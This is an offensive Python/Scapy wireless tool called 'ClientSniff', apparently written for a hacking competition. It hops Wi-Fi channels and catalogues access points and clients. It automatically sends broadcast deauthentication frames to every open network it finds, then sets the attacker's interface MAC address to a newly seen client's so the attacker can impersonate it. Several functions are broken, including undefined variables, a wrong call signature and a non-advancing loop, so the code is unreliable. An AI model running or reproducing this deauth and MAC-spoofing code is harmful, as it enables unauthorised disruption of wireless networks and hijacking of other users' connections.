#!/usr/bin/env python
############################## ClientSniff #####################################
# This application does:
# And was written for the #TRiKC 0x01 Competition on 11/12/14 in Kansas City
# ots of code "borrowed" from (and thanks to)
# http://danmcinerney.org/how-to-kick-everyone-around-you-off-wifi-with-python/
# http://pen-testing.sans.org/blog/pen-testing/2011/10/13/special-request-wireless-client-sniffing-with-scapy
#
# airmon-ng stop mon0 mon1
# airmon-ng start wlan0
############################## ClientSniff #####################################

from scapy.all import *
conf.verb = 0  # Scapy I thought I told you to shut up
import os
import argparse
from threading import Thread, Lock
from subprocess import Popen, PIPE

############################## Config #####################################
## As of right now, this script is primarily written for the MK5 Pineapple
## In future versions I will make it more available to other platforms

sniffinterface = 'mon0'
clientinterface = 'wlan0'
version = '0x01'


############################## Setup #####################################

# Next, declare a Python list to keep track of client MAC addresses
# that we have already seen so we only print the address once per client.
observedAPs = {}
targetAPs = {}
spoofmac = ''
# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m'  # red
G  = '\033[32m'  # green
O  = '\033[33m'  # orange
B  = '\033[34m'  # blue
P  = '\033[35m'  # purple
C  = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T  = '\033[93m'  # tan


def channel_hop():
	'''
	First time it runs through the channels it stays on each channel for 5 seconds
	in order to populate the deauth list nicely. After that it goes as fast as it can
	'''
	global monchannel, first_pass

	channelNum = 0
	err = None

	while 1:
		if args.channel:
			with lock:
				monchannel = args.channel
		else:
			channelNum += 1
			if channelNum > 11:
				channelNum = 1
				with lock:
					first_pass = 0
			with lock:
				monchannel = str(channelNum)

			proc = Popen(['iw', 'dev', sniffinterface, 'set', 'channel', monchannel], stderr=PIPE)
			for line in proc.communicate()[1].split('\n'):
				if len(line) > 2:  # iw dev shouldnt display output unless there's an error
					print line #err = '['+RED+'-'+WHITE+'] Channel hopping failed: '+RED+line+WHITE

		#output(err, monchannel)
		if args.channel:
			time.sleep(.05)
		else:
			# For the first channel hop thru, do not deauth
			if first_pass == 1:
				time.sleep(1)
				continue

def insert_ap(pkt):
	global lastaction
	bssid = pkt[Dot11].addr3
	pInfo = pkt[Dot11Elt]
	cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
	ssid, channel = None, None
	crypto = set()
	ssid = pkt[Dot11Elt].info
	channel = str(ord(pkt[Dot11Elt:3].info))
	while isinstance(pkt, Dot11Elt):
		if pInfo.ID == 48:
			crypto.add("WPA2")
		elif pInfo.ID == 221 and pInfo.info.startswith('\x00P\xf2\x01\x01\x00'):
			crypto.add("WPA")
		#p = pInfo.payload
	if not crypto:
		if 'privacy' in cap:
			crypto.add("WPA/WPA2")
			observedAPs[bssid] = {'ssid': ssid, 'bssid': bssid, 'channel': channel, 'clients': {}, 'crypto': ' / '.join(crypto)}
		else:
			crypto.add("OPN")
			targetAPs[bssid] = {'ssid': ssid, 'bssid': bssid, 'channel': channel, 'clients': {}, 'crypto': ' / '.join(crypto)}
			for x in range(0, 9):
				sendp(RadioTap()/Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7))
				lastaction = ('Deauth %s' % x)


def sniffmgmt(p):
	global lastaction
	# Define our tuple (an immutable list) of the 3 management frame
	# subtypes sent exclusively by clients. I got this list from Wireshark.
	stamgmtstypes = (0, 2, 4, 20)
	bssid = p[Dot11].addr3
	# Make sure the packet has the Scapy Dot11 layer present
	if p.haslayer(Dot11):  # Is it a wifi packet?
		if p.addr1 and p.addr2:
			if p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp):
				if bssid not in observedAPs:  # This checks both Dictionaries for BSSID, if not found, adds it
					if bssid not in targetAPs:
						lastaction = 'NEW AP FOUND: %s / %s' % (bssid, p[Dot11Elt].info)
						insert_ap(p)  # Pass the insert_ap function the packet for processing.
					#if args.verboseMode: lastaction = ("New SSID Found: %s \t BSSID: %s \t Channel: %s' % (ssid, bssid, ap_channel)")
					#observedAPs[bssid] = {'ssid':ssid, 'bssid':bssid, 'channel':ap_channel,'clients':{}}

			# Ignore all the noisy packets like spanning tree
			if noise_filter(p.addr1, p.addr2):
				#lastaction = ('Noisy packet detected -- Removed from processing')
				return

			# Management = 1, data = 2
			try:
				if p.type in [1, 2]:
					client = p.addr1
					bssid = p.addr2
					lastaction = 'Client: %s found on BSSID: %s' % (client, bssid)
						#if bssid in ('40:16:7e:f4:78:39', '00:13:37:a5:21:2f'):
							#raw_input('!!!!!!!')

					###### Check to see if BSSID already in the ##--Target--## List
					if bssid in targetAPs:  # BSSID already in the Target list
						if client not in targetAPs[bssid]['clients']:  # Do we already know about the target client?
							lastaction = ('New Client Found: %s \t AP: %s' % (client, bssid))
							targetAPs[bssid]['clients'][client] = {'count': 1}
							targetAPs[bssid]['clients'][client]['internet'] = False
							clientMode(client)
						else:  # We already know about it, lets increment the counter
							targetAPs[bssid]['clients'][client]['count'] = targetAPs[bssid]['clients'][client]['count'] + 1
							lastaction = "incremented target counter for %s" % client

					###### Check to see if BSSID already in the ##--Observed--## List
					elif bssid in observedAPs:
						if client not in observedAPs[bssid]['clients']:
							observedAPs[bssid]['clients'][client] = {'count': 1}
							lastaction = ('New Client Found: %s \t AP: %s' % (client, bssid))
						else:
							observedAPs[bssid]['clients'][client]['count'] = observedAPs[bssid]['clients'][client]['count'] + 1
							lastaction = ('Incremented observed counter for %s' % client)

					else:
						return

			except:
				return
	output(observedAPs, targetAPs)

'''
AP
	BSSID
	ESSID
	CHANNEL
	CLIENTS
		MAC
			Count
'''


def output(observedAPs, targetAPs):
	time.sleep(1)
	os.system('clear')
	banner()
	print(T + 'Auto Targeted Access Points' + W)
	print O + 'BSSID            ' + '\t CH ' + "\t CRYPT \t ESSID" + W
	for ap in targetAPs:
		print(targetAPs[ap]['bssid'] + "\t " + targetAPs[ap]['channel'] + "\t " + targetAPs[ap]['crypto'] + "\t" + targetAPs[ap]['ssid'])
		#raw_input(targetAPs[ap])
		for client in targetAPs[ap]['clients']:
			if spoofmac == client:
				print(O + '  [' + G + 'CLIENT' + O + '] ' + G + '%s -- [%s]' + R + 'CURRENTLY SPOOFED' + W % (client, targetAPs[ap]['clients'][client]['count']) + W)
			else:
				print(O + '  [' + G + 'CLIENT' + O + '] ' + G + '%s -- [%s]' % (client, targetAPs[ap]['clients'][client]['count']) + W)

	print
	print
	print(T + 'Other Observed AccessPoints -- Not worth targeting' + W)
	print(O + 'BSSID            ' + '\t CH ' + "\t CRYPT \t        ESSID" + W)
	for ap in observedAPs:
		print(observedAPs[ap]['bssid'] + "\t " + observedAPs[ap]['channel'] + "\t " + observedAPs[ap]['crypto'] + "\t" + observedAPs[ap]['ssid'])
		#raw_input(observedAPs[ap])
		for client in observedAPs[ap]['clients']:
			print(O + '  [' + G + 'CLIENT' + O + '] ' + C + '%s -- [%s]' % (client, observedAPs[ap]['clients'][client]['count']) + W)
	if args.verboseMode:
		print
		print('[' + R + '>>>>' + W + '] LastAction: %s' % lastaction)



def noise_filter(addr1, addr2):
	# Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
	ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
	for i in ignore:
		if i in addr1 or i in addr2:
			return True


def clientMode(targetMac):
	lastaction = 'Attempting to change mac addy of %s' % clientinterface
	subprocess.check_call(["ifconfig","%s" % clientinterface, "up"])
	subprocess.check_call(["ifconfig","%s" % clientinterface, "hw", "ether","%s" % targetMac])
	if checkLinuxMac(device,mac):
		spoofmac = targetMac
	else:
		print "[-] Something went wrong"

def checkLinuxMac(mac):
    """Returns true if the current device mac address matches the mac given as input"""
    output = subprocess.Popen(["ifconfig", "%s" % clientinterface], stdout=subprocess.PIPE).communicate()[0]
    index = output.find('HWaddr') + len('HWaddr ')
    localAddr = output[index:index+17].lower()
    return mac == localAddr



def parse_args():
	#Create the arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--verbose", help="Enable Verbose mode (for debugging purposes) Example: -v", action='store_true', dest='verboseMode')
	return parser.parse_args()


def banner():
	print(GR + '        ' + '>' * 18 + '<' * 17)
	print(GR + '        >>>>>>>>' + G + ' ClientSniff ' + T + 'v' + version + GR + ' <<<<<<<<' + W)
	print(GR + '        ' + '>' * 18 + '<' * 17)
	if args.verboseMode: print('            ' + '[' + R + '>>>>' +W + '] Verbose mode enabled\n')

if __name__ == "__main__":
	os.system('clear')
	lastaction = ""
	args = parse_args()
	banner()
	# Start channel hopping
	lock = Lock()
	DN = open(os.devnull, 'w')
	first_pass = 1
	hop = Thread(target=channel_hop)
	hop.daemon = True
	hop.start()

	# With the sniffmgmt() function complete, we can invoke the Scapy sniff()
	# function, pointing to the monitor mode interface, and telling Scapy to call
	# the sniffmgmt() function for each packet received. Easy
	try:
		lastaction = ("Starting wireless sniffing on %s" % sniffinterface)
		sniff(iface=sniffinterface, prn=sniffmgmt)
	except Exception, e:
		print ('error: %s' % e)
		sys.exit(0)
